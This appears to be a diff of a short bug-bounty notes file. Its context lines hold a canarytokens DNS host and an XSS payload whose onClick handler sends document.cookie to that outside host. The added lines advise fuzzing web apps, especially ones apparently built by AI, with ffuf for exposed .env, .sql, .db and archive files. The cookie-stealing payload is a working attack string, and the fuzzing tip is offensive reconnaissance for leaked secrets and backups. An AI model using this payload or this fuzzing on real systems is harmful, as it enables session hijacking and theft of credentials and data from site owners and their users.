@@ -45,3 +45,14 @@ DNS: kplqgniup6l8yal8p2ronc7aa.canarytokens.com
 
 
 "></div><a onClick="top['location']['href']='//kplqgniup6l8yal8p2ronc7aa.canarytokens.com/?c='+document.cookie">click me</
+
+
+
+
+lof web apps that are built by AI, it have .md and mostly 🔥
+so any app you test, JSP / PHP / ASP 
+
+Add for fuzzing the extensions
+ffuf -w /wordlist -u .com/FUZZ -e .md,.db,.txt,.xml,.sql,.7z,.zip,.tar.gz,.env 
+
+it will take some time, but it will be back with very good results♥
